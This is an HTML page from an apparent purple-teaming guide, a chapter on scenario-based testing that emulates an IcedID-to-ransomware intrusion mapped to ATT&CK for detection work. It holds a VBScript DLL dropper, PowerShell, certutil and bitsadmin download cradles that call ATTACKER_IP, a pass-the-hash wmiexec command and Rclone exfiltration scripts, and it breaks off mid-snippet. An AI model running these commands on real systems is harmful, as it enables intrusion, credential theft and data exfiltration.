@@ -1,0 +1,906 @@
+<!doctype html>
+<html lang="en-US"><head>
+   <meta charset="utf-8">
+    <!-- Chulapa Jekyll Theme -  -->
+    <!--  MIT License-->
+    <!-- Docs: https://dieghernan.github.io/chulapa -->
+    <!-- Repo: https://github.com/dieghernan/chulapa -->
+    <!-- Page build 2025-02-24 20:58:58 +0000 -->
+     <!-- Jekyll Version 3.10.0 -->
+    <!--Google Structured Data-->
+    <script type="application/ld+json">
+        {
+      "@context": "https://schema.org",
+	  "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:4000/part-I/the-scenario-based-methodology/"
+      },
+      "headline": "The Scenario-based Methodology",
+      "image": "https://github.com/ajpc500.png",
+      "datePublished": "2025-02-24T20:58:58+00:00",
+      "dateModified": "2025-02-24T20:58:58+00:00",
+      "author": {
+        "@type": "Person",
+        "name": "ajpc500"
+      },
+       "publisher": {
+        "@type": "Organization",
+        "name": "ajpc500",
+        "url": "http://localhost:4000/",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://github.com/ajpc500.png"
+        }
+      }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "name": "Home",
+        "item": "http://localhost:4000/"
+      },{
+        "@type": "ListItem",
+        "position": 2,
+        "name": "The Scenario-based Methodology"
+      }]
+    }
+    </script>
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebPage",
+    "name": "The Scenario-based Methodology",
+    "description": ""
+    }
+}
+</script><script type="application/ld+json">
+{
+  "@context" : "https://schema.org",
+  "@type" : "Person",
+  "homeLocation": {
+    "@type": "Place",
+    "name": "London, United Kingdom"
+    },
+  "description": "Publisher",
+  "name" : "ajpc500",
+  "url" : "http://localhost:4000/"
+}
+</script>
+   <title>The Scenario-based Methodology | A Guide to Purple Teaming</title>
+  <link rel="canonical" href="http://localhost:4000/part-I/the-scenario-based-methodology/">
+    <!-- Atom feed -->
+  <link href="http://localhost:4000/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed A Guide to Purple Teaming" >
+    <!-- RSS 2.0 feed -->
+  <link href="http://localhost:4000/rss.xml" type="application/rss+xml" rel="alternate" title="RSS 2.0 feed A Guide to Purple Teaming" >
+    <!-- Meta tags -->
+   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+   <meta name="author" content="ajpc500" >
+   <meta name="copyright" content="ajpc500" >
+   <meta name="description" content="">
+   <meta name="thumbnail" content="https://github.com/ajpc500.png" >
+   <meta name="robots" content="index, follow"><meta name="keywords" content="">
+    <!-- Chrome, Firefox OS and Opera -->
+  <meta name="theme-color" content="#000000">
+    <!-- OpenGraph -->
+   <meta property="og:title" content="The Scenario-based Methodology | A Guide to Purple Teaming" >
+   <meta property="og:site_name" content="A Guide to Purple Teaming | A Guide to Purple Teaming" >
+   <meta property="og:url" content="http://localhost:4000/part-I/the-scenario-based-methodology/" >
+   <meta property="og:type" content="website" >
+   <meta property="og:description" content="" >
+   <meta property="og:locale" content="en-US" >
+   <meta property="og:image" content="https://github.com/ajpc500.png" >
+    <!-- Twitter/X Cards -->
+   <meta name="twitter:card" content="summary_large_image"><!-- start custom head snippets -->
+<!-- this script is inserted before the css stylesheet -->
+<!-- end custom head snippets -->
+<!-- CSS -->
+    <!-- Preconnect with Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <!-- Fontawesome-->
+    <!-- v6 -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js" as="script" >
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/fonts/Chulapa/Chulapa-Bold_vmod.otf" as="font" type="font/otf" crossorigin>
+    <!-- Theme css (Bootstrap included) -->
+  <link rel="stylesheet" id="maincss" href="http://localhost:4000/assets/css/main.css" >
+    <!-- Highlighter -->
+  <link id="csshigh" rel="stylesheet" href="http://localhost:4000/assets/css/highlighter.css" >
+    <!-- Custom css -->
+  <link rel="stylesheet" href="http://localhost:4000/assets/css/custom.css" >
+      <!-- start custom head snippets -->
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<!-- end custom head snippets -->
+</head>
+<body class="d-flex flex-column h-entry" id="body">
+	<a class="u-url d-none" href="http://localhost:4000/part-I/the-scenario-based-methodology/">Invisible link to canonical for Microformats</a>
+	<div class="navbar-chulapa-fab">
+		<input type="checkbox" class="navbar-chulapa-fab-button d-none" id="navi-toggle">
+		<label for="navi-toggle" class="navbar-toggler p-1 m-0 text-center d-flex">
+			<span class="navbar-toggler-icon m-auto">&nbsp;</span>
+		</label>
+		<div class="navbar-chulapa-fab-background">&nbsp;</div>
+		<nav class="navbar-chulapa-fab-nav" aria-label="primary-navigation">
+			<ul class="navbar-nav text-center text-uppercase font-weight-light mt-0 mb-1 py-1">
+				<li class="nav-item">
+					<a class="nav-link px-3 navbar-brand mx-1 " href="http://localhost:4000/">Home</a>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-I:-How-Purple-Teaming-Works" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part I: How Purple Teaming Works</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-I:-How-Purple-Teaming-Works"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-basics-of-purple-teaming">1. The Basics of Purple Teaming </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/offensive-and-defensive-frameworks">2. Offensive and Defensive Frameworks </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-atomic-methodology">3. The Atomic Methodology </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-scenario-based-methodology">4. The Scenario-based Methodology </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-II:-Attack-Emulation-and-Detection-Lab" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part II: Attack Emulation and Detection Lab</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-II:-Attack-Emulation-and-Detection-Lab"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/environment-setup">5. Environment Setup </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/collecting-telemetry">6. Collecting Telemetry </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/network-traffic-and-event-tracing">7. Network Traffic and Event Tracing </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/lotl-with-atomic-red-team">8. Living-off-the-Land with Atomic Red Team </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/ad-recon-with-mitre-caldera">9. Active Directory Recon with MITRE Caldera </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/domain-compromise-with-mythic">10. Domain Compromise with Mythic </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-III:-Organizing-an-Exercise" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part III: Organizing an Exercise</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-III:-Organizing-an-Exercise"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/reporting-and-tracking">11. Reporting and Tracking </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/implementing-a-purple-teaming-function">12. Implementing a Purple Teaming Function </a></div>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/resources">Resources</a>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/errata">Errata</a>
+				</li></ul>
+		</nav>
+	</div>	<header class="d-flex align-items-center hero-chulapa"><div class="container-lg py-4">
+   <h1 class="p-name">The Scenario-based Methodology</h1>
+ </div>
+</header>
+	<main class="container-lg pb-3 flex-fill">
+		<div class="row pt-2">
+			<aside class="col-lg-2 mt-lg-3 small"></aside>
+			<article id="maincontent" class="col-lg-8 mt-3 e-content">
+			<div class="bs-component">
+   <div class="progress">
+       <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 33.3%; background-color:#eb34e1"></div>
+   </div>
+</div>
+<h2 id="introduction">Introduction</h2>
+<p>This chapter introduces a second purple teaming methodology - scenario-based testing.</p>
+<p>The complete test suites produced in this chapter can be found here:</p>
+<details>
+<summary><b>Initial Access and Execution Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">1</th>
+     <td>Zipped VBS Email Link</td>
+     <td>Spearphishing link</td>
+     <td>T1566.002</td>
+     <td>Zip password: <code>W1289</code></td>
+   </tr>
+   <tr>
+     <th scope="row">2</th>
+     <td>VBScript DLL Dropper</td>
+     <td>Visual Basic</td>
+     <td>T1059.005</td>
+     <td>Drop DLL to <code>C:\Windows\Temp\0370-1.dll</code></td>
+   </tr>
+   <tr>
+     <th scope="row">3</th>
+     <td>Regsvr32 DLL Execution</td>
+     <td>Regsvr32</td>
+     <td>T1218.010</td>
+     <td>Fetch and drop DLL to <code>%APPDATA%\iwiqocacod.dll</code></td>
+   </tr>
+   <tr>
+     <th scope="row">4</th>
+     <td>Rundll32 DLL Execution</td>
+     <td>Rundll32</td>
+     <td>T1218.011</td>
+     <td>Execute via <code>cmd /c</code></td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<details>
+<summary><b>Persistence Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">5</th>
+     <td>Scheduled Task via API</td>
+     <td>Scheduled task</td>
+     <td>T1053.005</td>
+     <td>Task repeats every hour after user logon. Executes DLL via <code>rundll32</code> with ordinal value (<code>#1</code>)</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<details>
+<summary><b>Discovery Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">6</th>
+     <td><code>cmd.exe /c chcp &gt;&amp;2</code></td>
+     <td>System language discovery</td>
+     <td>T1614.001</td>
+     <td>Spawned from <code>rundll32</code></td>
+   </tr>
+   <tr>
+     <th scope="row">7</th>
+     <td><code>ipconfig /all</code></td>
+     <td>System network configuration discovery</td>
+     <td>T1016</td>
+     <td>Spawned from <code>rundll32</code> and ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">8</th>
+     <td><code>systeminfo</code></td>
+     <td>System information discovery</td>
+     <td>T1082</td>
+     <td>Spawned from <code>rundll32</code> and ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">9</th>
+     <td><code>net config workstation</code></td>
+     <td>System owner/user discovery</td>
+     <td>T1033</td>
+     <td>Spawned from <code>rundll32</code></td>
+   </tr>
+   <tr>
+     <th scope="row">10</th>
+     <td><code>nltest /domain_trusts</code></td>
+     <td>Domain trust discovery</td>
+     <td>T1482</td>
+     <td>Spawned from <code>rundll32</code></td>
+   </tr>
+   <tr>
+     <th scope="row">11</th>
+     <td><code>nltest /domain_trusts /all_trusts</code></td>
+     <td>Domain trust discovery</td>
+     <td>T1482</td>
+     <td>Spawned from <code>rundll32</code></td>
+   </tr>
+   <tr>
+     <th scope="row">12</th>
+     <td><code>net view /all /domain</code></td>
+     <td>Remote system discovery</td>
+     <td>T1018</td>
+     <td>Spawned from <code>rundll32</code></td>
+   </tr>
+   <tr>
+     <th scope="row">13</th>
+     <td><code>net view /all</code></td>
+     <td>Remote system discovery</td>
+     <td>T1018</td>
+     <td>Spawned from <code>rundll32</code></td>
+   </tr>
+   <tr>
+     <th scope="row">14</th>
+     <td><code>net group "Domain Admins" /domain</code></td>
+     <td>Domain groups</td>
+     <td>T1069.002</td>
+     <td>Spawned from <code>rundll32</code> and ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">15</th>
+     <td><code>nltest  /dclist:</code></td>
+     <td>Remote system discovery</td>
+     <td>T1018</td>
+     <td>Executed via ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">16</th>
+     <td><code>net group "Domain Computers" /domain</code></td>
+     <td>Remote system discovery</td>
+     <td>T1018</td>
+     <td>Spawned from <code>rundll32</code> and via ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">17</th>
+     <td><code>net group "enterprise admin" /domain</code></td>
+     <td>Domain groups</td>
+     <td>T1069.002</td>
+     <td>Spawned from <code>rundll32</code></td>
+   </tr>
+   <tr>
+     <th scope="row">18</th>
+     <td><code>quser</code></td>
+     <td>System owner/user discovery</td>
+     <td>T1033</td>
+     <td>Executed via ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">19</th>
+     <td><code>route print</code></td>
+     <td>System network configuration discovery</td>
+     <td>T1016</td>
+     <td>Executed via ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">20</th>
+     <td>Port scan via netscan</td>
+     <td>Network service scanning</td>
+     <td>T1423</td>
+     <td>Binary dropped to desktop. Scan ports 135, 137, 445, 3389, 6160, 9392, 9393 and 9401</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<details>
+<summary><b>Command and Control Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">21</th>
+     <td>IcedID C2</td>
+     <td>Web protocols</td>
+     <td>T1071.001</td>
+     <td>Using multiple custom domains. TLS traffic on port 443.</td>
+   </tr>
+   <tr>
+     <th scope="row">22</th>
+     <td>ScreenConnect Installation</td>
+     <td>Remote access software</td>
+     <td>T1219</td>
+     <td>Dropped to <code>%LOCALAPPDATA%\Temp</code> via IcedID C2</td>
+   </tr>
+   <tr>
+     <th scope="row">23</th>
+     <td>ScreenConnect C2</td>
+     <td>Remote access software</td>
+     <td>T1219</td>
+     <td>Subdomains of <code>screenconnect.com</code></td>
+   </tr>
+   <tr>
+     <th scope="row">24</th>
+     <td>BITSAdmin Beacon Download</td>
+     <td>BITS jobs</td>
+     <td>T1197</td>
+     <td>Executed via ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">25</th>
+     <td>CertUtil</td>
+     <td>Ingress tool transfer</td>
+     <td>T1197</td>
+     <td>Executed via ScreenConnect</td>
+   </tr>
+   <tr>
+     <th scope="row">26</th>
+     <td>PowerShell Download Cradle</td>
+     <td>Web service</td>
+     <td>T1102</td>
+     <td>Executed via ScreenConnect. Use of <code>temp.sh</code> file hosting</td>
+   </tr>
+   <tr>
+     <th scope="row">27</th>
+     <td>Cobalt Strike C2</td>
+     <td>Web protocols</td>
+     <td>T1071.001</td>
+     <td>Raw IP address<br /><code>GET /load</code><br /><code>POST /submit.php</code><br />60 second sleep<br /> No sleep</td>
+   </tr>
+   <tr>
+     <th scope="row">28</th>
+     <td>CSharp Streamer Upload</td>
+     <td>Ingress tool transfer</td>
+     <td>T1105</td>
+     <td>Executable uploaded and launched from Desktop via existing C2</td>
+   </tr>
+   <tr>
+     <th scope="row">29</th>
+     <td>CSharp Streamer Websocket C2</td>
+     <td>Web protocols</td>
+     <td>T1071.001</td>
+     <td>Websocket C2 across ports 80, 135, 139, 443, 3389</td>
+   </tr>
+   <tr>
+     <th scope="row">30</th>
+     <td>Rclone Download</td>
+     <td>Ingress tool transfer</td>
+     <td>T1105</td>
+     <td>Download via browser on file server</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<details>
+<summary><b>Lateral Movement Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">31</th>
+     <td>Tool transfer via SMB</td>
+     <td>SMB/Windows admin shares</td>
+     <td>T1021.002</td>
+     <td>Uploaded to <code>C:\ProgramData\goat.exe</code> on DC and backup server<br />Uploaded to <code>C:\ProgramData\jer.exe</code> on file server</td>
+   </tr>
+   <tr>
+     <th scope="row">32</th>
+     <td>Execution via WMIexec.py</td>
+     <td>Windows remote management</td>
+     <td>T1021.006</td>
+     <td>Default output to <code>ADMIN$</code><br />Proxied via CSharp Streamer<br />Targeting DC</td>
+   </tr>
+   <tr>
+     <th scope="row">33</th>
+     <td>Tool Transfer via RDP</td>
+     <td>Remote Desktop Protocol</td>
+     <td>T1021.001</td>
+     <td>Upload ScreenConnect to desktop as <code>db.exe</code> and launch</td>
+   </tr>
+   <tr>
+     <th scope="row">34</th>
+     <td>Lateral Movement via RDP</td>
+     <td>Remote Desktop Protocol</td>
+     <td>T1021.001</td>
+     <td>Using native RDP client<br />RDP to domain controller and file server</td>
+   </tr>
+   <tr>
+     <th scope="row">35</th>
+     <td>Proxied RDP</td>
+     <td>Remote Desktop Protocol</td>
+     <td>T1021.001</td>
+     <td>SOCKS proxy RDP traffic from remote host</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<details>
+<summary><b>Credential Access Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">36</th>
+     <td>Dump LSASS from <code>cslite</code></td>
+     <td>LSASS memory</td>
+     <td>T1003.001</td>
+     <td>Using Mimikatz implementation</td>
+   </tr>
+   <tr>
+     <th scope="row">37</th>
+     <td>Dump LSASS from <code>WerFault</code></td>
+     <td>LSASS memory</td>
+     <td>T1003.001</td>
+     <td>Using Mimikatz implementation</td>
+   </tr>
+   <tr>
+     <th scope="row">38</th>
+     <td>Dump LSASS from <code>rundll32</code></td>
+     <td>LSASS memory</td>
+     <td>T1003.001</td>
+     <td>Using Mimikatz implementation</td>
+   </tr>
+   <tr>
+     <th scope="row">39</th>
+     <td>Perform DCSync</td>
+     <td>DCSync</td>
+     <td>T1003.006</td>
+     <td>Using Mimikatz implementation</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<details>
+<summary><b>Collection Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">40</th>
+     <td>Automated collection via <code>confucius_cpp</code></td>
+     <td>Data from Network Shared Drive</td>
+     <td>T1039</td>
+     <td>Executed from file server</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<details>
+<summary><b>Exfiltration Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">41</th>
+     <td>Exfiltration via SFTP using Rclone</td>
+     <td>Exfiltration over asymmetric encrypted non-C2 protocol</td>
+     <td>T1048.002</td>
+     <td>Executed from file server<br />Raw IP on port 22<br />VBS-&gt;BAT-&gt;Rclone</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<details>
+<summary><b>Impact Techniques</b></summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">#</th>
+     <th scope="col">Name</th>
+     <th scope="col">Technique</th>
+     <th scope="col">ATT&amp;CK ID</th>
+     <th scope="col">Procedure notes</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <th scope="row">42</th>
+     <td>Use of xcopy for ScreenConnect transfer</td>
+     <td>Lateral tool transfer</td>
+     <td>T1570</td>
+     <td>Executed from backup server<br />Transfer to C drive</td>
+   </tr>
+   <tr>
+     <th scope="row">43</th>
+     <td>Use of xcopy for ransomware transfer</td>
+     <td>Lateral tool transfer</td>
+     <td>T1570</td>
+     <td>Executed from backup server<br />Transfer to <code>C:\ProgramData</code></td>
+   </tr>
+   <tr>
+     <th scope="row">44</th>
+     <td>ScreenConnect execution with WMIC</td>
+     <td>Windows remote management</td>
+     <td>T1021.006</td>
+     <td>Executed from backup server</td>
+   </tr>
+   <tr>
+     <th scope="row">45</th>
+     <td>Ransomware execution with WMIC</td>
+     <td>Windows remote management</td>
+     <td>T1021.006</td>
+     <td>Executed from backup server<br />Limit to a benign executable.<br />Save encryption testing for lab environment</td>
+   </tr>
+   <tr>
+     <th scope="row">46</th>
+     <td>Veeam backup deletion</td>
+     <td>Inhibit system recovery</td>
+     <td>T1490</td>
+     <td>Manual deletion</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<hr />
+<h2 id="chapter-content">Chapter Content</h2>
+<p>This section provides reproductions of the key figures and code snippets seen in this chapter.</p>
+<h4 id="scoping-and-sequencing">Scoping and Sequencing</h4>
+<h5 id="planning-attack-chains">Planning Attack Chains</h5>
+<figure>
+<img src="/assets/images/4/scenarios-0.png" style="width: 75%" title="Figure 4-1" />
+<figcaption>Figure 4-1: Plotting attack chain scenarios</figcaption>
+</figure>
+<h5 id="making-mid-exercise-improvements">Making Mid-exercise Improvements</h5>
+<figure>
+<img src="/assets/images/4/scenarios-1.png" style="width: 75%" title="Figure 4-2" />
+<figcaption>Figure 4-2: The cyclical process of technique execution, defensive improvement, and subsequent validation</figcaption>
+</figure>
+<h4 id="generating-test-cases">Generating Test Cases</h4>
+<h5 id="initial-access-and-execution">Initial Access and Execution</h5>
+<p>The VBScript file embedded in a password-protected ZIP, delivered via a link in the body of an email.</p>
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Data</span><span class="o">=</span><span class="s">"T|V|q|Q|A|A|M|A|A|A|A|E|A|A|A|A|bart/|..."</span>
+<span class="k">Dim</span> <span class="nv">T</span><span class="p">,</span> <span class="n">T0</span><span class="p">,</span> <span class="n">T1</span>
+<span class="n">T0</span> <span class="o">=</span> <span class="n">Replace</span><span class="p">(</span><span class="n">Data</span><span class="p">,</span> <span class="s">"|"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+<span class="n">T1</span> <span class="o">=</span> <span class="n">Replace</span><span class="p">(</span><span class="n">T0</span><span class="p">,</span> <span class="s">"bart"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+<span class="n">T2</span> <span class="o">=</span> <span class="n">Replace</span><span class="p">(</span><span class="n">T1</span><span class="p">,</span> <span class="s">"biboran"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+<span class="n">T</span> <span class="o">=</span> <span class="n">T2</span>
+
+<span class="k">Dim</span> <span class="nv">D</span><span class="p">,</span><span class="n">E</span><span class="p">,</span><span class="n">B</span><span class="p">,</span><span class="n">S</span>
+<span class="k">Set</span> <span class="n">D</span><span class="o">=</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"Microsoft.XMLDOM"</span><span class="p">)</span>
+<span class="k">Set</span> <span class="n">E</span><span class="o">=</span><span class="n">D</span><span class="p">.</span><span class="n">createElement</span><span class="p">(</span><span class="s">"E"</span><span class="p">)</span>
+<span class="n">E</span><span class="p">.</span><span class="n">DataType</span><span class="o">=</span><span class="s">"bin.base64"</span>
+<span class="n">E</span><span class="p">.</span><span class="n">Text</span><span class="o">=</span><span class="n">T</span>
+<span class="n">B</span><span class="o">=</span><span class="n">E</span><span class="p">.</span><span class="n">NodeTypedValue</span>
+
+<span class="k">Set</span> <span class="n">objShell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span> <span class="s">"WScript.Shell"</span> <span class="p">)</span>
+
+<span class="n">quick_launch_location</span> <span class="o">=</span> <span class="s">"C://windows/Temp/0370-1.dll"</span>
+
+<span class="k">Set</span> <span class="n">S</span><span class="o">=</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"ADODB.Stream"</span><span class="p">)</span>
+<span class="n">S</span><span class="p">.</span><span class="n">Open</span>
+<span class="n">S</span><span class="p">.</span><span class="n">Type</span><span class="o">=</span><span class="mi">1</span>
+<span class="n">S</span><span class="p">.</span><span class="n">Write</span> <span class="n">B</span>
+<span class="n">S</span><span class="p">.</span><span class="n">SaveToFile</span> <span class="n">quick_launch_location</span><span class="p">,</span><span class="mi">2</span>
+<span class="n">S</span><span class="p">.</span><span class="n">Close</span>
+
+<span class="n">objShell</span><span class="p">.</span><span class="n">Run</span> <span class="s">"C://windows/system32/regsvr32.exe "</span> <span class="o">&amp;</span> <span class="n">quick_launch_location</span>
+</code></pre></div></div>
+<h5 id="discovery">Discovery</h5>
+<p>The list of commands executed as part of the discovery phase of the scenario.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd.exe /c chcp <span class="o">&gt;</span>&amp;2
+ipconfig /all
+systeminfo
+net config workstation
+nltest /domain_trusts
+nltest /domain_trusts /all_trusts
+net view /all /domain
+net view /all
+net group <span class="s2">"Domain Admins"</span> /domain
+nltest /dclist:
+net group <span class="s2">"Domain Computers"</span> /domain
+net group <span class="s2">"enterprise admins"</span> /domain
+quser
+route print
+</code></pre></div></div>
+<h5 id="command-and-control">Command and Control</h5>
+<p>The list of commands used to download tools onto compromised endpoints.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bitsadmin /transfer mydownloadjob /download /priority normal http://ATTACKER_IP/download/test1.exe C:<span class="se">\p</span>rogramdata<span class="se">\s</span>1.exe <span class="o">(</span>failed<span class="o">)</span>
+
+certutil <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="nt">-f</span> http://ATTACKER_IP/download/test1.exe C:<span class="se">\p</span>rogramdata<span class="se">\c</span>scs.exe 
+
+powershell.exe <span class="nt">-nop</span> <span class="nt">-w</span> hidden <span class="nt">-c</span> “IEX <span class="o">((</span>new-object net.webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">'http://ATTACKER_IP/ksajSk'</span><span class="o">))</span>”
+
+powershell.exe Invoke-WebRequest http://temp.sh/ATTACKER_URL/http64.exe <span class="nt">-OutFile</span> C:<span class="se">\p</span>rogramdata<span class="se">\r</span>r.exe   <span class="c"># Failed</span>
+</code></pre></div></div>
+<h5 id="lateral-movement">Lateral Movement</h5>
+<p>The Impacket <i>WMIexec.py</i> command used to execute a binary on a remote system.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python wmiexec.py <span class="nt">-hashes</span> :NThash DOMAIN/DomainAdmin@DC_IP C:<span class="se">\P</span>rogramData<span class="se">\g</span>oat.exe
+</code></pre></div></div>
+<h5 id="exfiltration">Exfiltration</h5>
+<p>The command used to configure RClone.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rclone.exe config
+</code></pre></div></div>
+<p>A VBScript used to execute a BAT file that subsequently executes RClone to copy content to a remote server.</p>
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Set</span> <span class="n">WshShell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
+<span class="n">WshShell</span><span class="p">.</span><span class="n">Run</span> <span class="n">chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">"c:\programdata\rcl.bat"</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">),</span> <span class="mi">0</span>
+<span class="k">Set</span> <span class="n">WshShell</span> <span class="o">=</span> <span class="k">Nothing</span>
+</code></pre></div></div>
+<p>An example of what the BAT file could contain.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@echo off
+Rclone.exe copy SRC_PATH DEST_HOST:DEST_PATH
+</code></pre></div></div>
+<h5 id="impact">Impact</h5>
+<p>Commands used to push the ScreenConnect installer and the encrypter malware to remote hosts and execute them with the <code class="language-plaintext highlighter-rouge">wmic</code> command.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ScreenConnect installer</span>
